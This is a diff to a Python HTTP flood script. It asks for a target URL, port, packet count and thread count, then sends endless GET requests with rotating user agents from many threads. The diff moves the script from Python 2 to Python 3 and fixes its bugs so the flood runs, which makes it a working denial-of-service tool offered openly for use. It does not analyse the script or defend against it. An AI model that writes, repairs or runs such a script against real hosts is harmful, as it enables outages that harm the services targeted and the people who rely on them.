@@ -13,10 +13,10 @@ Created by pawstar-lag
 Contact: foxxxqi_qsd1@protonmail.com
 Any impovements needed? Feel free to pull request!
 ''')
-url=raw_input("[+] Enter the target URL: ")
-port=int(raw_input("[+] Enter the port to attack: "))
-pack=int(raw_input("[+] Enter the number of packets in each request: "))
-tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
+url=str(input("[+] Enter the target URL: "))
+port=int(input("[+] Enter the port to attack: "))
+pack=int(input("[+] Enter the number of packets in each request: "))
+tn=int(input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
 # damn a lot of user agents
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
               "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -84,23 +84,20 @@ length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(port))
 req_args = target_host + ua + accept + reffer + content + length + "\r\n"
 def httpspam():
-  hh = random._urandom
+  hh = random._urandom(10)
   xx = int(0)
   while True:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      xx+=1
       s.connect((url, port))
       s.send(str.encode(req_args))
-      for i in range pack:
+      for i in range(pack):
         s.send(str.encode(req_args))
       print("[+] HTTP request {0} sent to {1}:{2}".format(str(xx),url,str(port)))
-threads = []
 # threading
+count=0
 for i in range(tn):
   t = threading.Thread(target=httpspam)
-  print("[+] Thread {0} created".format(str(tn)))
-  t.daemon = True
-  threads.append[t]
-for i in range(tn):
-  threads[i].start()
-for i in range(tn):
-  threads[i].join()
+  print("[+] Thread {0} created".format(str(i)))
+  t.start()
+  t.join()
